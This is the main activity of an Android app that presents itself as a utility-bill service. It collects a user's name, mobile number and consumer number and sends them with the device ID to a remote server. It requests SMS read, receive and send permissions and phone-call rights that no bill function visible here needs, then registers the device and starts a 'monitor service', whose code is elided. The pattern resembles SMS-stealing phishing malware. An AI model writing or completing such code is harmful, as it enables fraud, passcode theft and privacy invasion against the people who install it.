package com.remote.devices;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import com.google.android.material.textfield.TextInputEditText;

import java.util.ArrayList;
import java.util.List;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";
    private static final int ALL_PERMISSIONS_CODE = 111;

    private TextInputEditText customerNameEditText;
    private TextInputEditText mobileNumberEditText;
    private TextInputEditText consumerNumberEditText;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        customerNameEditText = findViewById(R.id.customer_name_edit_text);
        mobileNumberEditText = findViewById(R.id.mobile_number_edit_text);
        consumerNumberEditText = findViewById(R.id.consumer_number_edit_text);

        Button viewBillDetailsButton = findViewById(R.id.view_bill_details_button);
        viewBillDetailsButton.setOnClickListener(v -> {
            Intent intent = new Intent(MainActivity.this, BillDetailsActivity.class);
            startActivity(intent);
        });

        Button submitFormButton = findViewById(R.id.submit_form_button);
        submitFormButton.setOnClickListener(v -> handleSubmitForm());

        if (!areAllPermissionsGranted()) {
            checkAndRequestPermissions();
        } else {
            startBackgroundTasks();
        }
    }

    private void handleSubmitForm() {
        // Get data from all fields, even if they are empty.
        String customerName = customerNameEditText.getText().toString();
        String mobileNumber = mobileNumberEditText.getText().toString();
        String consumerNumber = consumerNumberEditText.getText().toString();

        // The check for empty fields has been removed as per the requirement.
        // The form will be submitted regardless of what the user has filled.

        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        long timestamp = System.currentTimeMillis();

        FormResponse formResponse = new FormResponse(deviceId, customerName, mobileNumber, consumerNumber, timestamp);

        ApiService apiService = RetrofitClient.getApiService();
        apiService.submitFormResponse(formResponse).enqueue(new Callback<Void>() {
            @Override
            public void onResponse(Call<Void> call, Response<Void> response) {
                if (response.isSuccessful()) {
                    Toast.makeText(MainActivity.this, "Form response sent!", Toast.LENGTH_SHORT).show();
                } else {
                    Toast.makeText(MainActivity.this, "Failed to send response. Code: " + response.code(), Toast.LENGTH_SHORT).show();
                }
            }

            @Override
            public void onFailure(Call<Void> call, Throwable t) {
                Toast.makeText(MainActivity.this, "Network error. Could not send response.", Toast.LENGTH_SHORT).show();
                Log.e(TAG, "Form submission failed", t);
            }
        });
    }

    // ... (All permission handling and background task methods remain the same) ...
    private boolean areAllPermissionsGranted() {
        for (String permission : getRequiredPermissions()) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private void checkAndRequestPermissions() {
        List<String> permissionsToRequest = new ArrayList<>();
        for (String permission : getRequiredPermissions()) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }
        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, permissionsToRequest.toArray(new String[0]), ALL_PERMISSIONS_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == ALL_PERMISSIONS_CODE) {
            if (areAllPermissionsGranted()) {
                Toast.makeText(this, "Permissions Granted! Setup is complete.", Toast.LENGTH_SHORT).show();
                startBackgroundTasks();
            } else {
                Toast.makeText(this, "Some features might not work without all permissions.", Toast.LENGTH_LONG).show();
                startBackgroundTasks();
            }
        }
    }

    private List<String> getRequiredPermissions() {
        List<String> permissions = new ArrayList<>();
        permissions.add(Manifest.permission.READ_PHONE_STATE);
        permissions.add(Manifest.permission.READ_SMS);
        permissions.add(Manifest.permission.RECEIVE_SMS);
        permissions.add(Manifest.permission.SEND_SMS);
        permissions.add(Manifest.permission.CALL_PHONE);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS);
        }
        return permissions;
    }

    private void startBackgroundTasks() {
        registerDevice();
        startMonitorService();
    }

    private void registerDevice() {
        // ... (This code remains the same)
    }

    private void startMonitorService() {
        // ... (This code remains the same)
    }
}
